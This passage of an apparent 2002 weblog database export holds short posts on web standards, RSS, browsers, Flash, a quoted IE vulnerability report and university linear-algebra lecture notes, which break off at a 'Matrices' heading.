&lt;p&gt;&lt;a href=&quot;javascript:var i=0;if(document.styleSheets.length&amp;gt;0){cs=!document.styleSheets[0].disabled;for(i=0;i&amp;lt;document.styleSheets.length;i++) document.styleSheets[i].disabled=cs;};void(cs=true);&quot;&gt;Disable stylesheets for current page&lt;/a&gt;&lt;/p&gt;</field>
		<field name="created">2002-09-11 01:40:29</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">412</field>
		<field name="title">Remind me why people still use IE</field>
		<field name="slug">remindMeWhyPeopleStillUseIE</field>
		<field name="body">&lt;p&gt;The Register: &lt;a href=&quot;http://www.theregister.co.uk/content/55/27048.html&quot;&gt;IE 6 SP1 omits fixes for 20 outstanding flaws&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote cite=&quot;http://www.theregister.co.uk/content/55/27048.html&quot;&gt;
&lt;p&gt;Because of the way frames (and iframes) are handled by IE version 5.5 and above, attackers are able to get to all sorts of mischief with minimal effort, including:&lt;/p&gt;
&lt;ul&gt;
 &lt;li&gt;Read local files from the victim's hard drive, using a default local resource (ironically dubbed &quot;PrivacyPolicy&quot;) that contains frames in IE&lt;/li&gt;
 &lt;li&gt;Execute arbitrary programs on the victim's computer, using the woefully misnamed &quot;PrivacyPolicy&quot; resource&lt;/li&gt;
 &lt;li&gt;Read a victim's cookie and content from any remote site that contains a frame, which can lead to session-stealing and account compromise on sites containing frames - such as Hotmail&lt;/li&gt;
 &lt;li&gt;Forge the content of any site that contains a frame. For example, the attacker could show the user a fake login screen at hotmail.com and log the results to a database&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;p&gt;Luckily, &lt;a href=&quot;http://www.mozilla.org/&quot;&gt;an upgrade&lt;/a&gt; is available which provides immunity to all of the above vulnerabilities (sorry, I just couldn't resist that particular dig ;) ).&lt;/p&gt;</field>
		<field name="created">2002-09-11 12:47:11</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">413</field>
		<field name="title">MySQLFront vanishes</field>
		<field name="slug">MySQLFrontVanishes</field>
		<field name="body">&lt;p&gt;Does anyone know what's up with &lt;a href=&quot;http://www.mysqlfront.de/&quot;&gt;MySQLFront&lt;/a&gt;?&lt;/p&gt;
&lt;blockquote cite=&quot;http://www.anse.de/mysqlfront/&quot;&gt;&lt;p&gt;This project has been discontinued.&lt;/p&gt;&lt;/blockquote&gt;&lt;p&gt;This is really strange - a new version was released just the other weekend and now the project seems to have just terminated with no explanation.&lt;/p&gt;</field>
		<field name="created">2002-09-11 13:01:54</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">414</field>
		<field name="title">effnews part two</field>
		<field name="slug">effnewsPartTwo</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://effbot.org/zone/effnews-2.htm&quot;&gt;Fetching and Parsing RSS Data&lt;/a&gt; is the second installment of &lt;a href=&quot;http://effbot.org/zone/effnews.htm&quot;&gt;the effnews project&lt;/a&gt;, a series of tutorials on creating an RSS news reader in Python. This time topics covered include exception handling and event based XML parsing using &lt;code&gt;xmllib&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Incidentally, the article is hosted on &lt;a href=&quot;http://effbot.org/zone/&quot;&gt;zone.effbot.org&lt;/a&gt;, which calls itself &lt;q cite=&quot;http://effbot.org/zone/&quot;&gt;Fredrik Lundh's brainstorming subsite&lt;/q&gt; and seems to be a Wiki-style repository for miscellaneous articles and pieces of content. It contains a wealth of interesting Python tidbits if you're willing to spend some time browsing around. I'm a big fan of what I call the Wiki model of content management (one namespace, a free form navigation structure) and the zone looks is a great example of this model in action.&lt;/p&gt;</field>
		<field name="created">2002-09-11 13:37:24</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">415</field>
		<field name="title">Flash applications</field>
		<field name="slug">flashApplications</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.oreillynet.com/pub/a/javascript/2002/09/05/flash_runtime.html&quot;&gt;Flash MX and the Bigger Picture: Lightweight Internet Applications&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote cite=&quot;http://www.oreillynet.com/pub/a/javascript/2002/09/05/flash_runtime.html?page=2&quot;&gt;&lt;p&gt;
While I propose what may be a radical notion to some, with additional consideration the value of lightweight Internet applications starts to become apparent. I am not proposing that the browser is dying, but rather that it would be enhanced by an application-centric complement. Flash MX and its underlying SWF format are ready to provide such a solution today, though some have misgivings because SWF is a proprietary format held by one company--Macromedia. However, few viable alternatives currently exist to address this emerging need.
&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;I've been getting the impression that Macromedia are repositioning Flash as a tool for creating web applications rather than one for creating standard web sites. This seems like a sensible move to me - I seriously doubt Flash will ever be as good a format for serving normal documents as HTML, but as a light-weight web application platform Flash has many obvious advantages. I remain concerned that it is based on what is still a proprietary format - the internet's as it exists today is built on open standards and anything that moves away from that weakens the universal nature of the web. &lt;acronym title=&quot;Scalable Vector Graphics&quot;&gt;SVG&lt;/acronym&gt; looks promising but could take years to gain proper support, so for the moment it looks like Flash MX remains the most viable solution to this problem.&lt;/p&gt;</field>
		<field name="created">2002-09-11 14:01:41</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">416</field>
		<field name="title">RSS 1.0 feed now available</field>
		<field name="slug">newRSS10Feed</field>
		<field name="body">&lt;p&gt;I've set up my first &lt;a href=&quot;http://simon.incutio.com/syndicate/rss1.0&quot;&gt;new syndication feed&lt;/a&gt; using RSS 1.0. I've checked the feed against &lt;a href=&quot;http://www.ldodds.com/rss_validator/1.0/validator.html&quot;&gt;this RSS validator&lt;/a&gt; and it seems to pass, but throws a warning that item descriptions are meant to be between 0 and 500 characters in length. As I want to provide the full contents of my entries in the feed (for people using aggregators such as &lt;a href=&quot;http://www.disobey.com/amphetadesk/&quot;&gt;AmphetaDesk&lt;/a&gt;) I've decided to ignore the warning and leave it as it is.&lt;/p&gt; 


</field>
		<field name="created">2002-09-11 16:12:54</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">417</field>
		<field name="title">New form of spam protection</field>
		<field name="slug">newFormOfSpamProtection</field>
		<field name="body">&lt;p&gt;I've had an idea for a new way of hiding email addresses from spam harvesters - shield the address behind a form that must be submitted via POST. Site visitors can now click a button on my &lt;a href=&quot;/contact/&quot;&gt;Contact page&lt;/a&gt; to reveal my email address. Spammers could always circumvent the system by writing a harvester that parses HTML pages for forms and submits every single one, but I'm hoping they won't bother.&lt;/p&gt;</field>
		<field name="created">2002-09-11 22:34:57</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">418</field>
		<field name="title">Wining and Dining</field>
		<field name="slug">winingAndDining</field>
		<field name="body">&lt;p&gt;Kevin Burton: &lt;a href=&quot;http://www.peerfear.org/rss/permalink/1031728134.shtml&quot;&gt;My Dinner with Dave Winer&lt;/a&gt;. Something tells me this &lt;em&gt;won't&lt;/em&gt; be linked from Scripting News.&lt;/p&gt;</field>
		<field name="created">2002-09-12 01:52:00</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">419</field>
		<field name="title">More link muppets</field>
		<field name="slug">moreLinkMuppets</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.hsbc.com/code/tools/insidehsbc/ToolsMain.jhtml?toolName=Legal&amp;amp;contentPage=/public/group/legal/en/terms_and_conditions.html&quot; title=&quot;HSBC Global - Legal Statements&quot;&gt;HSBC&lt;/a&gt; (you have to look pretty hard for this one, they've hidden it under &quot;Trade Marks and Copyright&quot;):&lt;/p&gt;
&lt;blockquote cite=&quot;http://www.hsbc.com/code/tools/insidehsbc/ToolsMain.jhtml?toolName=Legal&amp;amp;contentPage=/public/group/legal/en/terms_and_conditions.html&quot;&gt;
&lt;p&gt;In particular no one may use a part of the Site or any Local Site on any other website, or link any other website to the Site or any Local Site, without our prior written permission or the consent of the relevant HSBC Group member.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Link courtesy of &lt;a href=&quot;http://www.dontlink.com/&quot;&gt;Don't Link to Us!&lt;/a&gt;, a blog that tracks blatently stupid linking policies.&lt;/p&gt;</field>
		<field name="created">2002-09-12 11:20:15</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">420</field>
		<field name="title">Randal Rust on accessibility</field>
		<field name="slug">randalRustOnAccessibility</field>
		<field name="body">&lt;p&gt;Randal Rust has posted &lt;a href=&quot;http://www.r2communications.com/cssTests/form3.html&quot; title=&quot;Sample Form&quot;&gt;an updated version&lt;/a&gt; of his excellent CSS forms demo. While exploring Randal's site I stumbled across &lt;a href=&quot;http://www.r2communications.com/articles/soup.html&quot;&gt;ALPHABET SOUP: A web designer's journey to standards and accessibility&lt;/a&gt;, an excellent article advocating CSS, web standards and accessibility which includes the following noteworthy quotation:&lt;/p&gt;
&lt;blockquote cite=&quot;http://www.r2communications.com/articles/soup.html&quot;&gt;&lt;p&gt;
Accessibility means that users of any kind, using any device, should have access to the essential information that is contained on your web site.
&lt;/p&gt;
&lt;/blockquote&gt;</field>
		<field name="created">2002-09-12 13:44:30</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">421</field>
		<field name="title">Surfing the apocalypse</field>
		<field name="slug">surfingTheApocalypse</field>
		<field name="body">&lt;p&gt;The Guerrilla News Network: &lt;a href=&quot;http://www.guerrillanews.com/redux/&quot;&gt;S-11 Redux: (Channel) Surfing the Apocalypse&lt;/a&gt;.&lt;/p&gt;
&lt;blockquote cite=&quot;http://www.guerrillanews.com/redux/&quot;&gt;&lt;p&gt;
So, in the face of our media's shameless propaganda campaign, we have taken it upon ourselves to intuit what the intentions and goals of this war truly are. In what is surely a departure from our traditional NewsVideo format, GNN presents S-11 Redux: (Channel) Surfing the Apocalypse. Culled from over 20 hours of television footage recorded over a one month period and across 13 networks, S-11 Redux is a sound-bite blitzkrieg that challenges the messages we have been fed from our mainstream media and the government it serves. Be warned - this video moves quickly and will require at least two viewings to digest its full impact. You may never be able to look at the coverage of S-11 and its post-impact coverage the same way, ever again.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;Well worth the download. I particularly enjoyed the George Bush section, accompanied by Ukulele.&lt;/p&gt;</field>
		<field name="created">2002-09-12 14:12:38</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">422</field>
		<field name="title">The float label bug</field>
		<field name="slug">theFloatLabelBug</field>
		<field name="body">&lt;p&gt;Strange Mozilla bug: In some versions of Mozilla / Netscape 6+ &lt;code&gt;&amp;lt;label&amp;gt;&lt;/code&gt; elements that have a float applied to them will vanish. Tom Gilder's test case can be viewed &lt;a href=&quot;http://tom.me.uk/2002/4/moz-label.html&quot; title=&quot;Mozilla test case - label floats&quot;&gt;here&lt;/a&gt;. I tried it in Mozilla 1.1 beta and the page behaved as expected but Netscape 6.22 suffered from the bug. Apparently Netscape 7 still has the bug, which would suggest it was spun off from the Mozilla code base before that bug was fixed. Rust Randal's &lt;a href=&quot;&quot;&gt;CSS form demo&lt;/a&gt; gets around this problem with a span inside a label, which seems to be the most effective workaround but is frustrating as it requires additional markup to solve what is a pretty obscure bug.&lt;/p&gt;</field>
		<field name="created">2002-09-12 14:41:35</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">423</field>
		<field name="title">The RDF in RSS</field>
		<field name="slug">theRDFinRSS</field>
		<field name="body">&lt;p&gt;DJ Adams: &lt;a href=&quot;http://www.pipetree.com/qmacro/2002/Sep/08#tech/rdf/rssrdf&quot;&gt;The RDF in RSS&lt;/a&gt;: &lt;q cite=&quot;http://www.pipetree.com/qmacro/2002/Sep/08#tech/rdf/rssrdf&quot;&gt;Just a bit of a brain dump of what I've been learning over the past couple of days&lt;/q&gt;.&lt;/p&gt;
</field>
		<field name="created">2002-09-12 14:57:42</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">424</field>
		<field name="title">Zeldman on Caesar's palace?</field>
		<field name="slug">zeldmanOnCaesarsPalace</field>
		<field name="body">&lt;p&gt;Is &lt;a href=&quot;http://www.kottke.org/02/09/020910z_in_vegas.html&quot; title=&quot;Z in Vegas&quot;&gt;this photo&lt;/a&gt; for real?&lt;/p&gt;</field>
		<field name="created">2002-09-12 23:38:07</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">425</field>
		<field name="title">Arouse your PC</field>
		<field name="slug">arouseYourPC</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://scriptingnews.userland.com/backissues/2002/09/12#romanticWeb&quot;&gt;Dave Winer&lt;/a&gt;: &lt;q cite=&quot;http://scriptingnews.userland.com/backissues/2002/09/12#romanticWeb&quot;&gt;Why be Semantic when you can be Romantic?&lt;/q&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://www.disobey.com/dnn/2002/09/index.shtml#001375&quot;&gt;Morbus Iff&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote cite=&quot;http://www.disobey.com/dnn/2002/09/index.shtml#001375&quot;&gt;&lt;p&gt;
Well, buddy ol' pal, the pornoWeb already exists. The Semantic Web is all about making computers aroused, not humans. When computers are aroused, they're much happier pleasing the idiot desires of us fleshlings. So, really, the Semantic Web is about survival and prevention - I'd much rather have happy, complacent computers than angry robots plotting to overthrow the human regime.
&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;I'm pretty sure it's bad manners to quote an entire post like that but Morbus's comment just didn't seem to work if I broke it up any smaller :) To make up for it, here's an extra plug for the &lt;a href=&quot;http://www.disobey.com/dnn/&quot; title=&quot;it rocks&quot;&gt;Disobey Nonsense Network&lt;/a&gt; (and a plug for &lt;a href=&quot;http://www.disobey.com/amphetadesk/&quot; title=&quot;it rocks too&quot;&gt;AmphetaDesk&lt;/a&gt;as well, a very cool desktop RSS aggregator).&lt;/p&gt;</field>
		<field name="created">2002-09-12 23:45:08</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">426</field>
		<field name="title">Another excellent blog</field>
		<field name="slug">anotherExcellentBlog</field>
		<field name="body">&lt;p&gt;Jeremy Allaire, Chief Technology Officer at Macromedia, now &lt;a href=&quot;http://radio.weblogs.com/0113297/&quot; title=&quot;Jeremy Allaire&amp;apos;s Radio&quot;&gt;has a blog&lt;/a&gt;. Macromedia's attitude towards weblogging has been fantastic - they seem to really understand the medium and the opportunities it provides, both in terms of PR and keeping their development community involved and informed. Jeremy &lt;a href=&quot;http://radio.weblogs.com/0113297/2002/09/11.html#a2&quot;&gt;writes&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote cite=&quot;http://radio.weblogs.com/0113297/2002/09/11.html#a2&quot;&gt;&lt;p&gt;
While I'll sometimes post Macromedia specific content here, the intention is really to explore the broad technologies, ideas and companies that are working on the converence of media, communications and applications.
&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;So far it's all been about Flash, but for the first day of a new blog there have been a whole bunch of good links.&lt;/p&gt;</field>
		<field name="created">2002-09-13 00:15:32</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">427</field>
		<field name="title">More thoughs on Flash editors</field>
		<field name="slug">moreThoughsOnFlashEditors</field>
		<field name="body">&lt;p&gt;Flash Voodoo's &lt;a href=&quot;http://www.flashvoodoo.com/weblog.php?id=P28&quot;&gt;Battle of the Flash Text Editor Components&lt;/a&gt; (via &lt;a href=&quot;http://radio.weblogs.com/0113297/2002/09/11.html#a6&quot;&gt;Jeremy Allaire&lt;/a&gt;) is interesting - the editors are all good, but they all suffer from the same problem in that the code they generate is pretty horrible (font tags and presentational markup galore). This is a limitation of Flash rather than a problem with the coders - our Flash Editor (currently under development by my colleague Richard) has the same problem, so we are looking in to ways of cleaning up the resulting code and turning it in to XHTML.&lt;/p&gt;

&lt;p&gt;In my opinion options to change font colour, size and typeface are a drawback rather than a benefit - most applications for rich text editors will be content management systems that try to create a standard look and feel across a site, rather than letting content editors apply their own styles when they create the content. My ideal editor would be more of a structural XHTML editor than anything else - users would be able to add headers, lists and other structural elements and then apply styles from a logical selection controlled by the CMS. The only question is whether or not Flash MX is a suitable platform for this kind of application (as a complete Flash novice I can only guess at its potential in this regard).&lt;/p&gt;</field>
		<field name="created">2002-09-13 00:17:02</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">428</field>
		<field name="title">Fun with Unicode</field>
		<field name="slug">funWithUnicode</field>
		<field name="body">&lt;p&gt;Hixie has &lt;a href=&quot;http://ln.hixie.ch/?start=1031829070&amp;amp;count=1&quot; title=&quot;One, two, thr-ooooh, U 20E0 COMBINING ENCLOSING CIRCLE BACKSLASH!&quot;&gt;submerged himself&lt;/a&gt; in Unicode. Stuart &lt;a href=&quot;http://www.kryogenix.org/days/000261.cas&quot; title=&quot;Dingbats&quot;&gt;muses&lt;/a&gt; that the reason Unicode is so (potentially) huge is a legacy of the Y2K problem. I prefer the explanation given in &lt;a href=&quot;http://www.oreilly.com/catalog/xmlnut/&quot;&gt;XML in a Nutshell&lt;/a&gt; (my current reading matter of choice for three-and-a-half-hour-train-journeys-from-hell):&lt;/p&gt;
&lt;blockquote cite=&quot;http://www.oreilly.com/catalog/xmlnut/&quot;&gt;&lt;p&gt;
Unicode can potentially hold more than a million characters, but no one is willing to say in public where they think most of the remaining million characters will come from. *&lt;/p&gt;

&lt;p&gt;* Footnote: Privately, some developers are willing to admit that they're preparing for the day when we're part of a Galactic Federation of thousands of intelligent species&lt;/p&gt;
&lt;/blockquote&gt;</field>
		<field name="created">2002-09-13 00:42:53</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">429</field>
		<field name="title">Mozilla web-sniffer</field>
		<field name="slug">mozillaWebSniffer</field>
		<field name="body">&lt;p&gt;Because I keep on forgetting where it is, &lt;a href=&quot;http://webtools.mozilla.org/web-sniffer/&quot;&gt;View HTTP and HTML Source&lt;/a&gt;, a handy tool for debugging &lt;acronym title=&quot;HyperText Transfer Protocol&quot;&gt;HTTP&lt;/acronym&gt; type stuff courtesy of those fine Mozilla folk.&lt;/p&gt;</field>
		<field name="created">2002-09-13 00:48:44</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">430</field>
		<field name="title">Java GUI Builder</field>
		<field name="slug">javaGUIBuilder</field>
		<field name="body">&lt;p&gt;One of the things I really like about &lt;a href=&quot;http://www.pythoncard.org/&quot;&gt;PythonCard&lt;/a&gt; is that it enables (and in fact actively encourages) you to completely separate the GUi of your application from the program logic. In PythonCard you design your GUI by adding and dragging elements around in the resource editor, then create a simple Python class with event handlers to define what should happen when your GUI is interacted with. Now, thanks to the &lt;a href=&quot;http://jgb.sourceforge.net/&quot;&gt;Java GUI Builder&lt;/a&gt; (spotted on &lt;a href=&quot;http://www.brunningonline.net/simon/blog/archives/000393.html#000393&quot; title=&quot;Java Gui Builder&quot;&gt;Small Values of Cool&lt;/a&gt;), you can do the same thing in Java.&lt;/p&gt;

&lt;p&gt;The GUI builder allows you to define your user interface in an XML file, which is then interpreted by Java at run-time. This allows you to make changes to the interface without recompiling the program (or editing any Java code), and also gives users the ability to edit their interface without needing to alter your code. It's a very clever piece of code.&lt;/p&gt;

&lt;p&gt;XML seems to be a popular choice for defining GUI's these days - Mozilla has &lt;a href=&quot;http://www.mozilla.org/xpfe/xptoolkit/xulintro.html&quot; title=&quot;Introduction to a XUL Document&quot;&gt;XUL&lt;/a&gt;, &lt;a href=&quot;http://www.xwt.org/&quot;&gt;XWT&lt;/a&gt; allows developers to write web based GUI applications with XML and now the Java GUI Builder takes this trend a step further. It seems like a logical progression - after all, GUIs are basically collections of nested components and XML fits that kind of situation like a glove.&lt;/p&gt;</field>
		<field name="created">2002-09-13 17:58:35</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">431</field>
		<field name="title">mod_python donated to the ASF</field>
		<field name="slug">modPythonDonated</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.modpython.org/&quot;&gt;mod_python&lt;/a&gt; has been &lt;a href=&quot;http://www.modpython.org/donation.txt&quot;&gt;donated&lt;/a&gt; to the Apache Software Foundation. This is excellent news - I have always been slightly wary of mod_python as it has a reputation for being unstable, but with the ASF directly supporting it hopefully any stability problems will soon be a thing of the past.&lt;/p&gt;</field>
		<field name="created">2002-09-13 17:53:20</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">432</field>
		<field name="title">Mozilla 1.2 alpha</field>
		<field name="slug">mozilla12alpha</field>
		<field name="body">&lt;p&gt;The first alpha version of Mozilla 1.2 has been &lt;a href=&quot;http://www.mozilla.org/releases/&quot;&gt;released&lt;/a&gt;, with the most notable new feature being &lt;a href=&quot;http://www.mozilla.org/projects/ui/accessibility/typeaheadfind.html&quot;&gt;Type Ahead Find&lt;/a&gt;. I've played with this on previous Mozilla builds (it was available as an addon) and it's an interesting feature - you can navigate around a page by typing the names of links on that page (as soon as you type enough of the link for it to be recognisable the browser selects the link for you). The implementation in 1.2 also allows you to search for items on the page by typing a backslash followed by the search terms.&lt;/p&gt;

&lt;p&gt;While this is a very clever feature I'm not sure I support it's inclusion in the main Mozilla distribution, for one simple reason: It rules out pretty much every key on the keyboard as a keyboard shortcut. I've been playing with Opera a bit more recently (inspired by Tim Luoma's &lt;a href=&quot;http://www.tntluoma.com/opera/lover/&quot;&gt;30 Days to becoming an Opera Lover&lt;/a&gt; series) and one of my favourite features is Opera's keyboard shortcut support, in particular the images key. To toggle images, hit 'g' - with images off pages load a great deal faster (especially on a modem) and if you need to see them you can toggle tham back on again with a single key press. Now that Mozilla has Type Ahead shortcuts like this are pretty much out of the question.&lt;/p&gt;

&lt;p&gt;Normally I install new releases of Mozilla as soon as they come out, but this time I am holding back - not because of type ahead (I'm looking forward to trying it out, my objections being purely hypothetical seeing as Mozilla has no keyboard shortcuts that will be affected) but because I've just started using &lt;a href=&quot;http://www.mozilla.org/projects/calendar/&quot;&gt;Mozilla Calendar&lt;/a&gt; which is currently incompatible with 1.2. Calendar is a superb piece of software - it looks gorgeous, has an intuitive interface and seems to be everything I've been looking for in a Calendar application. It also has the ability to export calendars as iCalendar XML, an open format &lt;a href=&quot;http://www.oasis-open.org/cover/draft-dawson-ical-xml-dtd-01.txt&quot;&gt;documented here&lt;/a&gt; (as an IETF draft).&lt;/p&gt;</field>
		<field name="created">2002-09-13 20:01:00</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">433</field>
		<field name="title">No updates for a while</field>
		<field name="slug">noUpdatesForAWhile</field>
		<field name="body">&lt;p&gt;I'm moving back up to Bath this afternoon, in to a student house with 4 other people. I don't know if we even have a phone line at the moment so I'll probably be offline for the next few days.&lt;/p&gt;</field>
		<field name="created">2002-09-14 13:33:49</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">434</field>
		<field name="title">Returning</field>
		<field name="slug">returning</field>
		<field name="body">&lt;p&gt;Cameron Barrett is back from Russia and &lt;a href=&quot;http://www.camworld.com/journal/2002/09/&quot; title=&quot;This permalink is not ready yet...&quot;&gt;brings photos&lt;/a&gt;. Scott Andrew is back from his summer vacation and &lt;a href=&quot;http://www.scottandrew.com/weblog/2002_09#a000412&quot;&gt;brings CSS tips&lt;/a&gt;. I am back at University and stuck without bandwidth for the next few weeks.&lt;/p&gt;</field>
		<field name="created">2002-09-17 15:52:52</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">435</field>
		<field name="title">Computational complexity</field>
		<field name="slug">computationalComplexity</field>
		<field name="body">&lt;p&gt;The &lt;a href=&quot;http://www.fortnow.com/lance/complog/&quot;&gt;Computational Complexity Web Log&lt;/a&gt; (via &lt;a href=&quot;http://www.kottke.org/02/09/020917finding_the_.html&quot; title=&quot;Finding the order of the multiplicative group (mod n)...zuh?&quot;&gt;Kottke&lt;/a&gt;):&lt;/p&gt;
&lt;blockquote cite=&quot;http://www.fortnow.com/lance/complog/&quot;&gt;&lt;p&gt;
This is the first of a long series of posts giving an informal introduction to computational complexity.&lt;/p&gt;

&lt;p&gt;Computational complexity theorists try to determine which problem are efficiently solvable on a computer. This sentence already leads to many questions: What is a problem? What is efficiently solvable? Let us first start off with a truly basic question, what is a computer?
&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;Great stuff for computer science students - I wish I'd had this 6 months ago when complexity came up in my programming course.&lt;/p&gt;</field>
		<field name="created">2002-09-18 12:57:49</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">436</field>
		<field name="title">RSS2 modules</field>
		<field name="slug">rss2modules</field>
		<field name="body">&lt;p&gt;It seems RSS 2.0 has the capability to support modules (I was under the false impression that this ability was restricted to RDF modules in the rival RSS 1.0 specification). Following a post by Mark Pilgrim on &lt;a href=&quot;http://diveintomark.org/archives/2002/09/17.html#blink_and_youll_miss_it&quot; title=&quot;Blink and you’ll miss it&quot;&gt;B-linking&lt;/a&gt; (the blogging equivalent of a B-movie) Dave Winer has released a draft of &lt;a href=&quot;http://backend.userland.com/blogChannelModule&quot; title=&quot;blogChannel RSS module&quot;&gt;blogChannel&lt;/a&gt;, the first ever RSS 2.0 module.&lt;/p&gt;</field>
		<field name="created">2002-09-18 13:04:09</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">437</field>
		<field name="title">Maths for Apps lecture 1</field>
		<field name="slug">mathsForAppsLecture1</field>
		<field name="body">&lt;p&gt;These notes are for Dr Daniel Richardson's course &quot;Mathematics for Applications I&quot; at the University of Bath.The required text book is &quot;Linear Algebra with Applications&quot; by G. Williams, published by Jones and Bartlett&lt;/p&gt;

&lt;h3&gt;Linear Equations&lt;/h3&gt;

&lt;p&gt;An equation such as:&lt;/p&gt;

&lt;p class=&quot;equation&quot;&gt;x + 3y = 9&lt;/p&gt;

&lt;p&gt;is called a &lt;dfn&gt;linear equation&lt;/dfn&gt;.&lt;/p&gt;

&lt;p&gt;The solution is the collection of pairs of real numbers x and y for which that equation is true. The graph of the solution is a straight line on the xy plane.&lt;/p&gt;

&lt;p&gt;Consider a &lt;dfn&gt;system&lt;/dfn&gt; of two equations in x and y, for example:&lt;/p&gt;

&lt;p class=&quot;equation&quot;&gt;
x + 3y = 9&lt;br /&gt;
-2x + y = -4
&lt;/p&gt;

&lt;p&gt;A pair (x, y) satisfying &lt;em&gt;both&lt;/em&gt; equations is a &lt;dfn&gt;solution&lt;/dfn&gt; of the system. Typically, there will be a single solution where the two graphs intersect.&lt;/p&gt;

&lt;p&gt;For systems of 2 equations in 2 unknowns there are three possibilities:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;The two lines intersect, giving one solution&lt;/li&gt;
&lt;li&gt;The two lines are parallel, giving no solution&lt;/li&gt;
&lt;li&gt;The two lines are identical, giving many solutions&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;So, for two equations with two unknowns you can not have any result that is not covered by the above scenarios.&lt;/p&gt;

&lt;h4&gt;3 dimensional case&lt;/h4&gt;

&lt;p&gt;The solution of one equation, 3 unknowns:&lt;/p&gt;

&lt;p class=&quot;equation&quot;&gt;ax + by + cz = d&lt;/p&gt;

&lt;p&gt;a, b, c and d are constants&lt;/p&gt;

&lt;p&gt;The solution is a plane in xyz space.&lt;/p&gt;

&lt;p&gt;Now try a system of 3 equations in 3 unknowns:&lt;/p&gt;

&lt;p class=&quot;equation&quot;&gt;
a&lt;sub&gt;11&lt;/sub&gt;x + a&lt;sub&gt;12&lt;/sub&gt;y + a&lt;sub&gt;13&lt;/sub&gt;z = b&lt;sub&gt;1&lt;/sub&gt;&lt;br /&gt;
a&lt;sub&gt;21&lt;/sub&gt;x + a&lt;sub&gt;22&lt;/sub&gt;y + a&lt;sub&gt;23&lt;/sub&gt;z = b&lt;sub&gt;2&lt;/sub&gt;&lt;br /&gt;
a&lt;sub&gt;31&lt;/sub&gt;x + a&lt;sub&gt;32&lt;/sub&gt;y + a&lt;sub&gt;33&lt;/sub&gt;z = b&lt;sub&gt;3&lt;/sub&gt;
&lt;/p&gt;

&lt;p&gt;This typically has a single unique solution, as there are 3 intersecting planes in xyz space. This can be imagined by visualising two intersecting planes (which intersect along a line) and then visualising the third plane intersecting that line at a point. Again we can have one solution, no solutions (for parallel planes) or many solutions. The many solutions case has several possibilities, including:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Two planes intersect to form a line, the other plane is parallel to and intersects that line&lt;/li&gt;
&lt;li&gt;All planes are the same&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;This one, many or none model works no matter how many equations or unknowns are involved.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;In general, we will study systems of n linear equations in m unknowns using the following notation:&lt;/p&gt;

&lt;p class=&quot;equation&quot;&gt;
a&lt;sub&gt;11&lt;/sub&gt;x&lt;sub&gt;1&lt;/sub&gt; + a&lt;sub&gt;12&lt;/sub&gt;x&lt;sub&gt;2&lt;/sub&gt; + ... + a&lt;sub&gt;1m&lt;/sub&gt;x&lt;sub&gt;m&lt;/sub&gt; = b&lt;sub&gt;1&lt;/sub&gt;&lt;br /&gt;
.&lt;br /&gt;
.&lt;br /&gt;
.&lt;br /&gt;
a&lt;sub&gt;n1&lt;/sub&gt;x&lt;sub&gt;1&lt;/sub&gt; + a&lt;sub&gt;n2&lt;/sub&gt;x&lt;sub&gt;2&lt;/sub&gt; + ... + a&lt;sub&gt;nm&lt;/sub&gt;x&lt;sub&gt;m&lt;/sub&gt; = b&lt;sub&gt;n&lt;/sub&gt;
&lt;/p&gt;

&lt;p&gt;So a&lt;sub&gt;ij&lt;/sub&gt; is the coefficient of x&lt;sub&gt;j&lt;/sub&gt; in equation i.&lt;/p&gt;

&lt;p&gt;We will represent such systems using matrices.&lt;/p&gt;

&lt;h3&gt;Matrices&lt;/h3&gt;

